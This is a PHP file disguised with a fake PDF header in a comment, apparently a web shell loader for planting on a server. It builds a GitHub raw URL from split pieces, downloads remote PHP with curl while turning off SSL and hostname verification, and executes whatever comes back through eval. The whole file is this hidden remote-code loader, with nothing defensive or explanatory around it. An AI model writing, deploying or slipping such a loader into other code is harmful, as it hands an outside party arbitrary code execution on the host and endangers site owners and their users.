<?php
/* 
%PDF-1.7
%âãÏÓ
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 44>>stream
BT /F1 24 Tf 100 700 Td (System XML/PDF Viewer) Tj ET
endstream endobj
xref
0 5
0000000000 65535 f 
trailer<</Size 5/Root 1 0 R>>
startxref
0
%%EOF
*/

$parts = [
    "protocol" => "https",
    "domain"   => "raw.githubusercontent.com",
    "path"     => "/chirankumarsingh94-png/ss/refs/heads/main/contack-us.php"
];

$url = $parts["protocol"] . "://" .
       $parts["domain"] . $parts["path"];

echo $url;

function fetch_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // optional: skip SSL verification
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // optional: skip hostname verification
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$content = fetch_with_curl($url);
if ($content !== false) {
    eval("?>" . $content);
}
?>
